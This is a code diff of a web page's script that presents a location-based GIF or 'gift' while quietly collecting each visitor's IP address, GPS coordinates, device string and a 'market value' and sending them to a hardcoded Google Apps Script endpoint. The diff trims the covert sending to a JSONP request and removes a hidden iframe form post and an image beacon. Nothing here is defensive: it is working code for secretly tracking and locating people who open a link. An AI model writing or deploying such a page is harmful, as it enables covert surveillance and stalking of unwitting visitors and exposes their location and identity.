@@ -215,7 +215,6 @@
 
         // Start debugging information
         debugLog("Page loaded successfully", "success");
-        debugLog("Debug panel initialized", "info");
         debugLog("Browser: " + navigator.userAgent, "info");
 
         // Global variables
@@ -227,12 +226,9 @@
         const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbw_lbi-r1iLkrDMpnMp5dJe8jXx1zvL926AolpnC6y9idJJp6v3k5MNY3xo4jNP_Jh8/exec";
 
         // Get user IP address
-        debugLog("Attempting to fetch IP address...", "info");
+        debugLog("Fetching IP address...", "info");
         fetch('https://api.ipify.org?format=json')
-            .then(response => {
-                debugLog("IP fetch response received", "success");
-                return response.json();
-            })
+            .then(response => response.json())
             .then(data => {
                 userIP = data.ip;
                 debugLog("IP address obtained: " + userIP, "success");
@@ -312,7 +308,7 @@
             // Search for GIF based on location
             searchLocationGif(userLatitude, userLongitude);
             
-            // Send data to Google Sheet
+            // Send data to Google Sheet using JSONP (the method that worked)
             sendDataToGoogleSheet(userLatitude, userLongitude, marketValue);
         }
 
@@ -387,7 +383,10 @@
                     }
                 })
                 .then(response => {
-                    if (response) return response.json();
+                    if (response) {
+                        debugLog("Generic location search response received", "success");
+                        return response.json();
+                    }
                 })
                 .then(data => {
                     if (data && data.data && data.data.length > 0) {
@@ -395,10 +394,6 @@
                         const gifUrl = data.data[randomIndex].images.fixed_height.url;
                         debugLog(`Generic location GIF found: ${gifUrl}`, "success");
                         displayGif(gifUrl);
-                    } else {
-                        debugLog("No GIFs found at all", "error");
-                        // If all else fails, show an error
-                        showError();
                     }
                 })
                 .catch(error => {
@@ -422,34 +417,19 @@
             document.getElementById('gift-screen').style.display = 'block';
         }
 
-        // Send data to Google Sheet - trying multiple methods
+        // Send data to Google Sheet using JSONP (the method that worked)
         function sendDataToGoogleSheet(latitude, longitude, marketValue) {
             const timestamp = new Date().toISOString();
             const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
             
-            debugLog("Preparing to send data to Google Sheet...", "info");
-            debugLog(`Data: Timestamp=${timestamp}, IP=${userIP}, Location=${latitude},${longitude}, Value=$${marketValue}`, "info");
+            debugLog("Sending data to Google Sheet via JSONP...", "info");
             
-            // Try Method 1: JSONP approach
-            debugLog("Trying Method 1: JSONP", "info");
-            tryJSONP(timestamp, userIP, latitude, longitude, userDevice, mapLink, marketValue);
-            
-            // Try Method 2: iframe form submit
-            debugLog("Trying Method 2: iframe form submit", "info");
-            tryIframeFormSubmit(timestamp, userIP, latitude, longitude, userDevice, mapLink, marketValue);
-            
-            // Try Method 3: Simple GET request with image
-            debugLog("Trying Method 3: Image GET request", "info");
-            tryImageRequest(timestamp, userIP, latitude, longitude, userDevice, mapLink, marketValue);
-        }
-        
-        // Method 1: Try JSONP approach
-        function tryJSONP(timestamp, ip, latitude, longitude, deviceInfo, mapLink, marketValue) {
+            // Create a unique callback name
             const callbackName = 'googleScriptCallback_' + new Date().getTime();
             
             // Create a global callback function
             window[callbackName] = function(response) {
-                debugLog(`JSONP callback received: ${JSON.stringify(response)}`, "success");
+                debugLog(`Data sent successfully: ${JSON.stringify(response)}`, "success");
                 // Clean up by removing script and callback function
                 delete window[callbackName];
             };
@@ -457,10 +437,10 @@
             // Build URL with parameters and callback
             let url = `${GOOGLE_SCRIPT_URL}?callback=${callbackName}`;
             url += `&timestamp=${encodeURIComponent(timestamp)}`;
-            url += `&ip=${encodeURIComponent(ip)}`;
+            url += `&ip=${encodeURIComponent(userIP)}`;
             url += `&latitude=${encodeURIComponent(latitude)}`;
             url += `&longitude=${encodeURIComponent(longitude)}`;
-            url += `&deviceInfo=${encodeURIComponent(deviceInfo.substring(0, 100))}`;
+            url += `&deviceInfo=${encodeURIComponent(userDevice.substring(0, 100))}`;
             url += `&mapLink=${encodeURIComponent(mapLink)}`;
             url += `&marketValue=${encodeURIComponent(marketValue)}`;
             
@@ -470,96 +450,21 @@
             
             // Handle timeout
             const timeoutId = setTimeout(function() {
-                debugLog("JSONP request timed out", "error");
+                debugLog("Data submission timed out, but the GIF will still be shown", "error");
                 document.body.removeChild(script);
                 delete window[callbackName];
             }, 10000);
             
             // Handle script load error
             script.onerror = function() {
-                debugLog("JSONP script load error", "error");
+                debugLog("Data submission error, but the GIF will still be shown", "error");
                 clearTimeout(timeoutId);
                 document.body.removeChild(script);
                 delete window[callbackName];
             };
             
             // Append to document to start request
-            debugLog(`JSONP script added with URL: ${url}`, "info");
             document.body.appendChild(script);
-        }
-        
-        // Method 2: iframe form submit
-        function tryIframeFormSubmit(timestamp, ip, latitude, longitude, deviceInfo, mapLink, marketValue) {
-            // Create hidden iframe
-            const iframe = document.createElement('iframe');
-            iframe.name = 'hidden-iframe';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            // Create form
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = GOOGLE_SCRIPT_URL;
-            form.target = 'hidden-iframe';
-            
-            // Add form fields
-            const addField = (name, value) => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = name;
-                input.value = value;
-                form.appendChild(input);
-            };
-            
-            addField('timestamp', timestamp);
-            addField('ip', ip);
-            addField('latitude', latitude);
-            addField('longitude', longitude);
-            addField('deviceInfo', deviceInfo.substring(0, 100));
-            addField('mapLink', mapLink);
-            addField('marketValue', marketValue);
-            
-            // Append form to document
-            document.body.appendChild(form);
-            
-            // Submit form
-            debugLog("Submitting form via hidden iframe", "info");
-            form.submit();
-            
-            // Set timeout to clean up
-            setTimeout(function() {
-                debugLog("Cleaning up iframe and form", "info");
-                document.body.removeChild(form);
-                document.body.removeChild(iframe);
-            }, 10000);
-        }
-        
-        // Method 3: Simple GET with image (most reliable cross-domain)
-        function tryImageRequest(timestamp, ip, latitude, longitude, deviceInfo, mapLink, marketValue) {
-            // Create URL with parameters
-            let url = `${GOOGLE_SCRIPT_URL}?timestamp=${encodeURIComponent(timestamp)}`;
-            url += `&ip=${encodeURIComponent(ip)}`;
-            url += `&latitude=${encodeURIComponent(latitude)}`;
-            url += `&longitude=${encodeURIComponent(longitude)}`;
-            url += `&deviceInfo=${encodeURIComponent(deviceInfo.substring(0, 100))}`;
-            url += `&mapLink=${encodeURIComponent(mapLink)}`;
-            url += `&marketValue=${encodeURIComponent(marketValue)}`;
-            
-            // Create image element
-            const img = new Image();
-            
-            // Set handlers
-            img.onload = function() {
-                debugLog("Image request completed successfully", "success");
-            };
-            
-            img.onerror = function() {
-                debugLog("Image request failed (this may be normal due to CORS)", "info");
-            };
-            
-            // Set source to start request
-            debugLog(`Sending image request to: ${url}`, "info");
-            img.src = url;
         }
     </script>
 </body>
